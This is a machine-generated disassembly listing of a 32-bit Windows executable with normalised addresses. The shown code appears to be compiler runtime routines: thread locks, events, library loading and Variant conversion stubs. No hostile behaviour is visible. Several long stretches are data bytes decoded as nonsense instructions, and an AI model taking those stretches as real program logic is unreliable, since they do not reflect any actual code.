lea eax [ ebp - 0x14 ]
call sub_403f7c
retn
sub_40d0c4
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4088f4
mov [ rw-data ] eax
sub_40d148
push ebx
push esi
push edi
push ebp
call sub_4035b8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_40278c
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4031dc
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
sub_40d1b0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d198
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d238
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407e1c
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d138
mov [ ebp ] eax
sub_40d238
push ebx
mov ebx eax
mov eax ebx
call sub_40d198
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d138
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d278
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_40d2ec
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_40d378
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4031ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_40d378
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d334
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d1b0
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d140
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d120
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d140
test eax eax
je r-xdata
mov eax edi
call sub_40d334
test bl bl
je r-xdata
mov eax edi
call sub_40d368
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d120
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d12c
sub_40d414
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d1b0
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d140
mov eax ebx
call sub_40d34c
mov eax ebx
call sub_40d340
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d228
sub_40d464
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d1b0
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d358
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d12c
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d120
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d358
mov eax esi
call sub_40d34c
sub_40d4d0
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d1b0
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d228
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d120
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d34c
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d34c
sub_40d548
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d56c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d5e3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5ea
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032a0
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d548
test al al
jne r-xdata
mov al 0x1
sub_40d604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d676
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d658
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40443c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d65f
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d71a
dec eax
add [ edx + eax + 0x48 ] dh
add al ah
lea ecx [ eax ]
insb
add cl [ eax ]
pop esp
mov ecx [ eax ]
add cl [ fs : eax ]
movsb [ edi ] [ esi ]
lea ecx [ eax ]
pop esp
add cl [ eax ]
mov eax 0x5400488d
add cl [ eax ]
pushfd
mov cl [ eax ]
dec esp
add cl [ eax ]
push esp
mov cl [ eax ]
inc esp
add cl [ eax ]
cmp [ eax + ecx * 2 + 0x48023c00 ] cl
add ah dl
mov [ eax ] cs
xor al 0x2
dec eax
add [ eax + 0x2c004889 ] bl
add cl [ eax ]
cwde
lea ecx [ eax ]
and al 0x2
dec eax
add [ eax - 0x75 ] bl
dec eax
add [ eax ] ch
add [ eax ] al
add [ edx + eax ] bl
dec eax
add [ ebp + ecx * 4 + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add cl [ eax ]
in al dx
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
adc al 0x2
dec eax
add [ esp + ecx * 4 + 0x48 ] bh
add [ eax ] al
adc [ edx ] al
dec eax
add [ ecx + ecx * 4 + 0x48 ] ah
add [ eax ] al
or al 0x2
dec eax
add [ edx + ecx * 4 + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add cl [ eax ]
insb
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
add al 0x2
dec eax
add [ edx + ecx * 4 ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl [ eax ]
push esp
mov ecx [ eax ]
add [ eax ] al
add [ eax ] al
cld
add [ eax ] ecx
pop esp
mov [ eax ] cs
add [ eax ] al
add [ eax ] al
clc
add [ eax ] ecx
jo r-xdata
sub [ eax ] al
add [ eax ] al
sbb al 0x2
dec eax
add [ eax ] al
add [ eax ] al
add ah dh
add [ eax ] ecx
xor [ eax + ecx * 2 ] cl
add al dh
add [ eax ] ecx
adc [ ebp + 0x48 ] cl
add [ eax ] al
in al dx
add [ eax ] ecx
cld
mov [ eax ] cs
add [ eax ] al
add [ eax ] al
call 0x7841201a
mov [ eax ] cs
add [ eax ] al
add [ eax ] al
in al 0x1
dec eax
add [ eax - 0x75 ] al
dec eax
add [ eax ] al
add [ eax ] al
add al ah
add [ eax ] ecx
in al dx
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
fadd [ ecx ]
dec eax
add [ eax + 0x4889 ] ah
add [ eax ] al
add al bl
add [ eax ] ecx
clc
mov [ eax ] cs
add [ eax ] al
add [ eax ] al
aam 0x1
dec eax
add al bh
mov ecx [ eax ]
add [ eax ] al
add [ eax ] al
rol [ ecx ] 0x1
dec eax
add ah bl
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
int3
sub_40dad8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40db40
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db47
retn
mov eax r-xdata
call sub_403d28
mov eax r-xdata
call sub_403d50
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c210
call sub_40c314
call sub_40d0c4
call sub_40cc5c
mov eax rw-data
mov edx r-xdata
call sub_403fd0
sub_40db78
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40dbcc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc26
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404204
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40834c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc2d
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40dc38
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc92
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404204
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409844
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc99
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40dca4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dcfe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404204
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409818
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd05
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40dd10
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd6a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404204
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b26c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd71
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40dd7c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40ddd6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404204
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409870
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dddd
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40dde8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40de55
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404204
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408458
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de5c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_40de68
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dec8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4097cc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047a8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40decf
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40ded8
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40df38
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a9f8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047a8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df3f
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40df48
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dfac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4084f4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047a8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfb3
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40dfdc
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e008
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40db78
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbc0
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbcc
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc38
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dca4
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd10
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd7c
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dde8
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de68
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ded8
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df48
mov eax r-xdata
call sub_40dfdc
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e314
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e339
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e340
retn
sub_40e474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0040e4
add [ eax ] al
add ah dh
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
in eax 0x40
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
push ss
inc ebp
push esi
popad
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
pop ss
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
hlt
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
out 0x40 al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xc4126a6
add [ eax ] al
add ah dh
jns r-xdata
outsd
jb r-xdata
call sub_412686
inc ebx
popad
jb r-xdata
and ch ah
inc eax
add [ eax ] al
add [ eax ] al
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
pop ss
outsb
jbe r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
shr al 0xe5
inc eax
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
rol [ ebp + 0x40 ] 0x0
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
inc eax
add ah bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] al
add [ eax ] al
hlt
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ch ah
inc eax
add [ eax ] al
lea eax [ eax ]
mov esp 0x40e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0xc0040 ] bh
add [ eax ] al
hlt
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe7
outsd
jb r-xdata
inc esp
xor al 0x40
inc ebp
push esi
popad
jb r-xdata
out 0x40 al
add [ eax ] al
add [ eax ] al
inc ecx
jb r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
jb r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
hlt
inc eax
inc eax
add [ eax + eax ] cl
add [ eax ] al
hlt
rcl [ edi ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] cl
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e6 ] dh
add [ eax ] al
add ah dh
jns r-xdata
inc ebp
jb r-xdata
je r-xdata
popad
inc eax
add [ eax - 0x18 ] cl
inc eax
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dl
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xe6
inc eax
add [ eax + eax ] cl
add [ eax ] al
hlt
outsd
jb r-xdata
test [ ecx ] dh
inc eax
add [ eax - 0x23ffbfcf ] ah
dec bp
insd
outsd
jb r-xdata
test [ ecx ] dh
inc eax
add [ eax - 0x23ffbfcf ] ah
outsd
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
insd
jo r-xdata
popad
je r-xdata
inc eax
add ah ah
out 0x40 eax
